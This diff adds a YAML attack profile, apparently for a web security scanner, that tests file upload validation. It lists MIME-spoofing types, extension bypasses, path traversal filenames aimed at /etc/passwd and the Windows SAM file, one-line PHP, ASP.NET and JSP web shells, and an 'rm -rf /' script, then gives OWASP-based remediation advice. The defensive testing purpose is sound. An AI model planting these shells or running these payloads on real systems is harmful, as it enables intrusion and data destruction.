@@ -1,0 +1,143 @@
+# File Upload Bypass - Attack Profile
+# Tests for file upload validation vulnerabilities including MIME type spoofing,
+# extension filtering bypasses, and path traversal in uploads
+
+name: "File Upload Bypass"
+category: "file_upload"
+severity: "high"
+description: "Tests for file upload validation vulnerabilities including MIME type spoofing, extension filtering bypass, path traversal, and file size validation bypass"
+
+# Fields commonly vulnerable to file upload attacks
+target_fields:
+  - "file"
+  - "upload"
+  - "attachment"
+  - "document"
+  - "image"
+  - "profile_picture"
+  - "avatar"
+  - "media"
+
+# Indicators of successful file upload bypass
+success_indicators:
+  - "201"  # Created
+  - "200"  # OK
+  - "filename"  # File accepted in response
+  - "uploaded"  # File uploaded message
+  - "success"   # Upload success indicator
+
+# MIME type spoofing payloads
+mime_type_bypasses:
+  - "text/plain"  # Serve malicious script as plain text
+  - "application/octet-stream"  # Generic binary
+  - "image/jpeg"  # Spoof as image
+  - "image/png"
+  - "application/pdf"
+  - "text/html"  # HTML with scripts
+
+# Extension bypass payloads
+extension_bypasses:
+  - ".php.jpg"  # Double extension
+  - ".jpg.php"  # Reverse double extension
+  - ".php%00.jpg"  # Null byte injection
+  - ".php%20"  # Space bypass
+  - ".php."  # Trailing dot
+  - ".php5"  # Alternative PHP extension
+  - ".phtml"  # Alternative PHP extension
+  - ".shtml"  # Server-side HTML
+  - ".jsp"  # JSP extension
+  - ".aspx"  # ASP.NET extension
+  - ".asp"  # Classic ASP
+  - ".cs"  # C# source
+  - ".jspx"  # Alternative JSP
+  - ".cgi"  # CGI script
+
+# Path traversal payloads in upload filenames
+path_traversal_payloads:
+  - "../../../etc/passwd"
+  - "..\\..\\..\\windows\\system32\\config\\sam"
+  - "....//....//....//etc/passwd"
+  - "..%2f..%2f..%2fetc%2fpasswd"
+  - "..%252f..%252f..%252fetc%252fpasswd"  # URL encoded twice
+  - "images/../../../etc/passwd"
+
+# File size validation bypass payloads
+file_size_bypasses:
+  - "file_size_too_large"  # Test very large file
+  - "file_size_zero"  # Test empty file
+  - "file_size_negative"  # Test negative size (if supported)
+
+# Polyglot file payloads (valid in multiple formats)
+polyglot_payloads:
+  - "<?php system($_GET['cmd']); ?>"  # PHP shell
+  - "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\"); %>"  # ASP.NET
+  - "<%system(request.getParameter(\"cmd\"));%>"  # JSP
+  - "#!/bin/bash\nrm -rf /"  # Shell script
+  - "<?xml version=\"1.0\"?><![CDATA[<?php phpinfo(); ?>]]>"  # XML/PHP polyglot
+
+# Archive bypass payloads
+archive_bypasses:
+  - "zip_bomb"  # Zip bomb payload
+  - "tar_symlink"  # Symlink extraction
+  - "zip_path_traversal"  # Traversal in archive
+
+# General file upload attack payloads
+payloads:
+  # Simple file upload tests
+  - "test.txt"
+  - "shell.php"
+  - "shell.php.jpg"
+  - "shell.jpg.php"
+  - "shell.php%00.jpg"
+  - "image.jpg"
+  - "document.pdf"
+  
+  # Path traversal attempts
+  - "../../../tmp/test.txt"
+  - "..\\..\\..\\windows\\temp\\test.txt"
+  - "....//....//....//etc/passwd"
+
+remediation: |
+  File Upload Security Best Practices:
+  
+  1. MIME Type Validation:
+     - Validate MIME type on server-side, not just by extension
+     - Use magic number (file signature) verification
+     - Maintain whitelist of allowed MIME types
+  
+  2. File Extension Filtering:
+     - Use whitelist approach for allowed extensions
+     - Validate extension after removing null bytes and trailing characters
+     - Store original filename encrypted separately from upload path
+  
+  3. Path Traversal Prevention:
+     - Sanitize filenames to remove path traversal sequences
+     - Use random filename generation instead of user-provided names
+     - Store uploads outside web root or in non-executable directory
+  
+  4. File Size Limits:
+     - Implement file size limits both client and server-side
+     - Use Content-Length headers validation
+     - Set maximum upload size in web server config
+  
+  5. Execution Prevention:
+     - Store files in non-executable directories
+     - Set appropriate file permissions (644 or similar)
+     - Disable script execution in upload directory via .htaccess or web.config
+     - Use Content-Disposition: attachment headers
+  
+  6. Polyglot File Prevention:
+     - Re-encode/re-compress uploaded files
+     - Use image processing libraries to strip metadata
+     - Scan for polyglot signatures
+  
+  7. Archive Handling:
+     - Limit archive extraction depth
+     - Validate paths before extraction
+     - Use dedicated sandboxed extraction tools
+
+references:
+  - "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+  - "https://owasp.org/www-project-top-ten/2017/A4_2017-Broken_Access_Control"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+  - "https://portswigger.net/web-security/file-upload"
